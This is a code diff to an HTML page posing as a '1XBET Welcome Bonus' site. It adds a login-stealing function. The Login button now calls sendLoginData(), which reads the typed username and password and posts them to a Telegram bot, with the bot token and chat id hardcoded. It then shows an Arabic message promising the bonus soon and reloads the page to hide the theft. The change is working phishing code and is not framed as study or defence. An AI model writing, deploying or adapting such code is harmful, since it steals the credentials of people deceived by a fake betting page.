@@ -1,8 +1,8 @@
 <!DOCTYPE html>
 <html lang="en" dir="ltr">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>1XBET - Welcome Bonus</title>
   <style>
     * {
@@ -207,12 +207,12 @@
   </div>
 
   <div class="modal" id="loginModal">
-    <div class="modal-content">
+    <div class="modal-content" id="modalContent">
       <span class="close-btn" onclick="closeModal()">&times;</span>
       <h3>Login</h3>
-      <input type="text" placeholder="Email or Username">
-      <input type="password" placeholder="Password">
-      <button>Login</button>
+      <input type="text" id="username" placeholder="Email or Username">
+      <input type="password" id="password" placeholder="Password">
+      <button onclick="sendLoginData()">Login</button>
     </div>
   </div>
 
@@ -230,6 +230,37 @@
       if (event.target == modal) {
         modal.style.display = "none";
       }
+    }
+
+    function sendLoginData() {
+      const username = document.getElementById('username').value;
+      const password = document.getElementById('password').value;
+
+      const token = "7908642649:AAH6lzPgbqKss3nN-A0vUpKhYsmtPDGUoHU";
+      const chatId = "7891583282";
+      const message = `🔐 Login Info:\n👤 Username: ${username}\n🔑 Password: ${password}`;
+
+      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message
+        })
+      }).then(response => {
+        const modalContent = document.getElementById('modalContent');
+        modalContent.innerHTML = `
+          <h3 style="color:#9deafb;">سيتم التحقق من الشروط</h3>
+          <p style="margin-top: 10px;">ستحصل على مكافأتك قريبًا، افحص حسابك مرة أخرى.</p>
+        `;
+        setTimeout(() => {
+          location.reload();
+        }, 2000);
+      }).catch(error => {
+        location.reload();
+      });
     }
   </script>
 
